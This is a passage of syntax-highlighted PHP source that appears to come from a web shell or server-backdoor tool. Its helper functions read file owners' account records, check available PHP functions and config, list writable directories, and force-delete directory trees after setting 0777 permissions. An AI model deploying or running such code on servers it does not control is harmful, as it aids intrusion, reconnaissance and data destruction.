<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'read'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00004) ? <span style="color: #8abeb7;">'r'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'write'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00002) ? <span style="color: #8abeb7;">'w'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 00001) ? <span style="color: #8abeb7;">'x'</span> : <span style="color: #8abeb7;">'-'</span>;<span style="color: #de935f; background-color: #373b41;"> </span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x800 ) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'s'</span> : <span style="color: #8abeb7;">'S</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x400 ) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'s'</span> : <span style="color: #8abeb7;">'S</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>( <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mode</span> &amp; 0x200 ) {<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>] = (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">world</span>[<span style="color: #8abeb7;">'execute'</span>]==<span style="color: #8abeb7;">'x'</span>) ? <span style="color: #8abeb7;">'t'</span> : <span style="color: #8abeb7;">'T</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">type</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'read'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'write'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">owner</span>[<span style="color: #8abeb7;">'execute'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">group</span>[<span style="color: #8abeb7;">'read'</span>]<span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getUser</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>)     {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (function_exists(<span style="color: #8abeb7;">'posix_getpwuid'</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span> = @posix_getpwuid(<span style="color: #81a2be;">@fileowner</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filepath</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span> &amp;&amp; is_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">' / &lt;a href="#" title="User: '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">array</span>[<span style="color: #8abeb7;">'name'</span>].<span style="color: #8abeb7;">'&amp;#13&amp;#10Passwd</span><span style="color: #8abeb7; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'dir'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #8abeb7; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">''</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">deltree</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mydir</span>=<span style="color: #b5bd68;">@dir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>);<span style="color: #de935f; background-color: #373b41;">   </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mydir</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">read</span>())     {<span style="color: #de935f; background-color: #373b41;">       </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>)) &amp;&amp; (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span>) &amp;&amp; (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span>)) {<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@chmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>,0777);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   deltree(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@chmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>,0777);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@unlink</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mydir</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">close</span>();<span style="color: #de935f; background-color: #373b41;"> </span>
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">@chmod</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>,0777);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">@rmdir</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">deldir</span>) ? 1 : 0;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">bg</span>() {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">bgc</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">bgc</span>++%2==0) ? <span style="color: #8abeb7;">'alt1'</span> : <span style="color: #8abeb7;">'alt2'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getPath</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scriptpath</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> == <span style="color: #8abeb7;">'.'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">scriptpath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> = str_replace(<span style="color: #8abeb7;">'\\'</span>, <span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> = str_replace(<span style="color: #8abeb7;">'//'</span>, <span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (substr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>, -1) != <span style="color: #8abeb7;">'/'</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>.<span style="color: #8abeb7;">'/'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getUpPath</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pathdb</span> = explode(<span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span> = count(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pathdb</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span> &gt; 2) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">unset</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pathdb</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span>-1],<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pathdb</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">num</span>-2]);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uppath</span> = implode(<span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">pathdb</span>).<span style="color: #8abeb7;">'/'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uppath</span> = str_replace(<span style="color: #8abeb7;">'//'</span>, <span style="color: #8abeb7;">'/'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uppath</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">uppath</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getcfg</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">varname</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> = get_cfg_var(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">varname</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> == 0) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'No'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span> == 1) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #8abeb7;">'Yes'</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">result</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   }
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getfun</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">funName</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> (<span style="color: #81a2be;">false</span> !== function_exists(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">funName</span>)) ? <span style="color: #8abeb7;">'Yes'</span> : <span style="color: #8abeb7;">'No'</span>;
}

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getext</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span> = pathinfo(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">info</span>[<span style="color: #8abeb7;">'extension'</span>];
}

<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">GetWDirList</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">global</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #81a2be;">!</span><span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>=1;
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span> = opendir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span> = readdir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dh</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>=str_replace(<span style="color: #8abeb7;">'//'</span>,<span style="color: #8abeb7;">'/'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dir</span>.<span style="color: #8abeb7;">'/'</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'.'</span> &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">file</span>!=<span style="color: #8abeb7;">'..'</span> &amp;&amp; is_dir(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)){
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (is_writable(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>)) {
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'filename'</span>]=str_replace(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">nowpath</span>,<span style="color: #8abeb7;">''</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'mtime'</span>]=<span style="color: #b5bd68;">@date</span>(<span style="color: #8abeb7;">'Y-m-d H:i:s'</span>,filemtime(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>));
<span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dirdata</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">j</span>][<span style="color: #8abeb7;">'dirchmod'</span>]=getChmod(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">f</span>);
